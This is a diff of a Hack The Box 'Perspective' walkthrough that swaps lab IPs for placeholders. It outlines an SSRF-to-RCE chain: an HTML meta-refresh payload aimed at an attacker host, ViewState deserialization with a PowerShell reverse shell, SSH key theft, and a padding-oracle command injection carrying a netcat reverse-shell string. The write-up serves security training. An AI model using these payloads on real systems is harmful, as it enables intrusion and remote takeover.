@@ -13,7 +13,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 {{< youtube tmK0GIvnq6s >}}
 
 1. **Initial Reconnaissance**:
-   - Perform Nmap scan on the target IP (10.10.11.151) to identify open ports: SSH (22) and HTTP (80) running IIS.
+   - Perform Nmap scan on the target IP ([TARGET-IP]) to identify open ports: SSH (22) and HTTP (80) running IIS.
    - Access the web app on port 80, which redirects to perspective.htb (add to /etc/hosts).
    - Identify the web app as an ASP.NET application by testing file extensions (e.g., .aspx gives different 404 error).
 
@@ -40,7 +40,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 
 7. **SSRF via PDF Generation in Admin Panel**:
    - As admin, load user data and generate PDF.
-   - Inject HTML (e.g., <meta http-equiv="refresh" content="0;url=http://10.10.14.8:8000/pwned.html">) into product description to trigger SSRF during PDF rendering (using headless Chrome).
+   - Inject HTML (e.g., `<meta http-equiv="refresh" content="0;url=http://[ATTACKER-IP]:8000/pwned.html">`) into product description to trigger SSRF during PDF rendering (using headless Chrome).
    - Redirect to localhost:8000 to access Secure Password Service API.
    - Fetch /swagger/v1/swagger.json to understand API: /encrypt (GET) and /decrypt (POST) endpoints.
 
@@ -51,12 +51,12 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 
 9. **RCE via Malicious ViewState Deserialization**:
    - Use ysoserial.net with ViewState plugin, TypeConfuseDelegate gadget, machine key, decryption/validation algorithms, viewStateUserKey, and generator from a request.
-   - Command: ping 10.10.14.8 (test), then PowerShell reverse shell (encoded base64).
+   - Command: ping [ATTACKER-IP] (test), then PowerShell reverse shell (encoded base64).
    - Intercept request, replace __VIEWSTATE with malicious blob to get RCE as webuser.
 
 10. **Stable Shell via SSH**:
     - From reverse shell (as webuser), extract ~/.ssh/id_rsa.
-    - Copy to attack machine, chmod 600, and SSH as webuser@10.10.11.151.
+    - Copy to attack machine, chmod 600, and SSH as webuser@[TARGET-IP].
 
 11. **Access Staging App via Port Forward**:
     - From SSH shell, identify listening ports (e.g., 8009 via netstat).
@@ -66,7 +66,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 12. **Padding Oracle Attack on Staging Password Reset Token**:
     - In staging app, register user and initiate password reset to get encrypted token.
     - Use PadBuster on token (block size 16, URL-encoded base64, post data, error string "padding is invalid").
-    - Plaintext: Craft command injection (e.g., "root@perspective.htb && c:\programdata\nc.exe 10.10.14.8 9001 -e cmd.exe").
+    - Plaintext: Craft command injection (e.g., "root@perspective.htb && c:\programdata\nc.exe [ATTACKER-IP] 9001 -e cmd.exe").
     - Encrypt with PadBuster and submit in reset request to get reverse shell as administrator (due to staging running as admin).
 
 13. **Privilege Escalation to SYSTEM via JuicyPotato**:
@@ -77,7 +77,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 ### Phase 1: Initial Reconnaissance and Web Application Discovery
 
 #### 1. Port Scanning and Host Discovery
-- Perform Nmap scan on the target IP (10.10.11.151) to identify open ports: SSH (22) and HTTP (80) running IIS
+- Perform Nmap scan on the target IP ([TARGET-IP]) to identify open ports: SSH (22) and HTTP (80) running IIS
 - Access the web app on port 80, which redirects to perspective.htb (add to /etc/hosts)
 - Identify the web app as an ASP.NET application by testing file extensions (e.g., .aspx gives different 404 error)
 - **Technique**: Basic reconnaissance with Nmap (`-sC -sV`); virtual host enumeration and ASP.NET fingerprinting via HTTP responses
@@ -110,7 +110,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 
 #### 6. SSRF via PDF Generation in Admin Panel
 - As admin, load user data and generate PDF
-- Inject HTML (e.g., `<meta http-equiv="refresh" content="0;url=http://10.10.14.8:8000/pwned.html">`) into product description to trigger SSRF during PDF rendering (using headless Chrome)
+- Inject HTML (e.g., `<meta http-equiv="refresh" content="0;url=http://[ATTACKER-IP]:8000/pwned.html">`) into product description to trigger SSRF during PDF rendering (using headless Chrome)
 - Redirect to localhost:8000 to access Secure Password Service API
 - Fetch `/swagger/v1/swagger.json` to understand API: `/encrypt` (GET) and `/decrypt` (POST) endpoints
 - **Technique**: Server-Side Request Forgery (SSRF) via HTML injection in PDF generation; API discovery through Swagger documentation
@@ -125,13 +125,13 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 
 #### 8. RCE via Malicious ViewState Deserialization
 - Use ysoserial.net with ViewState plugin, TypeConfuseDelegate gadget, machine key, decryption/validation algorithms, viewStateUserKey, and generator from a request
-- Command: `ping 10.10.14.8` (test), then PowerShell reverse shell (encoded base64)
+- Command: `ping [ATTACKER-IP]` (test), then PowerShell reverse shell (encoded base64)
 - Intercept request, replace `__VIEWSTATE` with malicious blob to get RCE as webuser
 - **Technique**: .NET deserialization attack via malicious ViewState; ysoserial.net with TypeConfuseDelegate gadget
 
 #### 9. Stable Shell via SSH
 - From reverse shell (as webuser), extract `~/.ssh/id_rsa`
-- Copy to attack machine, chmod 600, and SSH as webuser@10.10.11.151
+- Copy to attack machine, chmod 600, and SSH as webuser@[TARGET-IP]
 - **Technique**: SSH key extraction and persistent access via key-based authentication
 
 ### Phase 5: Staging Application Discovery and Padding Oracle Attack
@@ -145,7 +145,7 @@ description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET 
 #### 11. Padding Oracle Attack on Staging Password Reset Token
 - In staging app, register user and initiate password reset to get encrypted token
 - Use PadBuster on token (block size 16, URL-encoded base64, post data, error string "padding is invalid")
-- Plaintext: Craft command injection (e.g., `"root@perspective.htb && c:\programdata\nc.exe 10.10.14.8 9001 -e cmd.exe"`)
+- Plaintext: Craft command injection (e.g., `"root@perspective.htb && c:\programdata\nc.exe [ATTACKER-IP] 9001 -e cmd.exe"`)
 - Encrypt with PadBuster and submit in reset request to get reverse shell as administrator (due to staging running as admin)
 - **Technique**: Padding Oracle attack with PadBuster; command injection via encrypted token manipulation
 
